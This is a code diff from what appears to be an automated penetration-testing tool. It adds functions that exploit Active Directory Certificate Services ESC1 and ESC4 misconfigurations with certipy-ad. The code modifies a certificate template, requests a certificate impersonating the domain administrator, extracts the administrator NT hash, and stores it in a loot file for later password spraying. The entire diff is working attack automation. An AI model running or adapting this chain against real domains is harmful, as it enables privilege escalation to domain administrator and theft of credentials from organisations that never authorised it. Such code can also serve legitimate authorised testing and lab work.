@@ -59,6 +59,117 @@ def _parse_adcs_find(out: str) -> list[tuple[str, str, str]]:
     return results
 
 
+def _adcs_esc4_restore(
+    ip: str, domain: str, user: str, pw: str,
+    template_name: str, backup_json: Path,
+    runner: Runner, findings: Findings,
+) -> None:
+    restore_cmd = [
+        "certipy-ad", "template",
+        "-u", f"{user}@{domain}",
+        "-p", pw,
+        "-template", template_name,
+        "-configuration", str(backup_json),
+        "-dc-ip", ip,
+    ]
+    findings.cmd(" ".join(restore_cmd))
+    runner.run(restore_cmd, f"adcs_esc4_restore_{template_name}", timeout=60)
+    findings.note(f"ESC4: template {template_name} restored to original configuration")
+
+
+def _adcs_esc_chain(
+    ip: str, domain: str, user: str, pw: str,
+    ca_name: str, template_name: str, esc_variant: str,
+    runner: Runner, findings: Findings, ws: Workspace,
+) -> None:
+    """Run the certipy req → auth chain for an ESC1 or ESC4 vulnerable template."""
+    exploit_dir = ws.exploit_dir
+    pfx_path = exploit_dir / "administrator.pfx"
+
+    findings.h4(f"ADCS {esc_variant}: {template_name}")
+
+    # ── ESC4: patch template to make it ESC1-exploitable ─────────────────────
+    if esc_variant == "ESC4":
+        backup_json = exploit_dir / f"{template_name}_original.json"
+        patch_cmd = [
+            "certipy-ad", "template",
+            "-u", f"{user}@{domain}",
+            "-p", pw,
+            "-template", template_name,
+            "-save-old",
+            "-dc-ip", ip,
+        ]
+        findings.cmd(" ".join(patch_cmd))
+        out = runner.run(patch_cmd, f"adcs_esc4_patch_{template_name}", timeout=60)
+
+        # certipy saves backup as <template>.json in CWD — move it to exploit/
+        cwd_backup = Path(f"{template_name}.json")
+        if cwd_backup.exists():
+            cwd_backup.rename(backup_json)
+
+        if not backup_json.exists():
+            findings.note(f"ESC4 template patch failed — no backup JSON found: {_trim(out, lines=5)}")
+            return
+
+    # ── Request certificate as administrator ──────────────────────────────────
+    req_cmd = [
+        "certipy-ad", "req",
+        "-u", f"{user}@{domain}",
+        "-p", pw,
+        "-ca", ca_name,
+        "-template", template_name,
+        "-upn", f"administrator@{domain}",
+        "-dc-ip", ip,
+        "-out", str(exploit_dir / "administrator"),
+    ]
+    findings.cmd(" ".join(req_cmd))
+    out_req = runner.run(req_cmd, f"adcs_{esc_variant.lower()}_req_{template_name}", timeout=60)
+
+    if not pfx_path.exists():
+        findings.note(
+            f"Certificate request failed for {template_name}: "
+            f"{_error_lines(out_req) or _trim(out_req, lines=5)}"
+        )
+        if esc_variant == "ESC4":
+            _adcs_esc4_restore(ip, domain, user, pw, template_name, backup_json, runner, findings)
+        return
+
+    findings.bullet(f"Certificate obtained → `{pfx_path.relative_to(ws.machine_dir)}`")
+
+    # ── Authenticate with PFX → NT hash ──────────────────────────────────────
+    auth_cmd = [
+        "certipy-ad", "auth",
+        "-pfx", str(pfx_path),
+        "-dc-ip", ip,
+        "-domain", domain,
+        "-username", "administrator",
+    ]
+    findings.cmd(" ".join(auth_cmd))
+    out_auth = runner.run(auth_cmd, f"adcs_{esc_variant.lower()}_auth_{template_name}", timeout=60)
+
+    nt_hash: str | None = None
+    for line in out_auth.splitlines():
+        m = re.search(r"Got hash for .+?:\s*[0-9a-fA-F:]+:([0-9a-fA-F]{32})", line)
+        if m:
+            nt_hash = m.group(1)
+            break
+
+    if nt_hash:
+        ws.append_hash_file("ntlm.hash", [f"administrator:{nt_hash}"])
+        ws.add_cred(f"administrator:{nt_hash}")
+        findings.bullet(f"**NT hash for administrator:** `{nt_hash}`")
+        findings.bullet("Hash saved to `loot/ntlm.hash` — cred-reuse phase will spray it")
+        findings.add_summary(f"**ADCS {esc_variant} → administrator NT hash** in `loot/ntlm.hash`")
+        print(f"    [+] ADCS {esc_variant}: administrator NT hash obtained")
+    else:
+        findings.note(f"Auth step ran but no NT hash parsed: {_trim(out_auth, lines=10)}")
+        print(f"    [!] ADCS {esc_variant}: auth ran but NT hash not found in output")
+
+    # ── ESC4: restore template ────────────────────────────────────────────────
+    if esc_variant == "ESC4":
+        _adcs_esc4_restore(ip, domain, user, pw, template_name, backup_json, runner, findings)
+
+
 def _parse_ldapdomaindump_users(out_dir: str, ws: Workspace) -> int:
     """Parse domain_users.html from ldapdomaindump and populate ws users.txt. Returns count added."""
     user_file = Path(out_dir) / "domain_users.html"
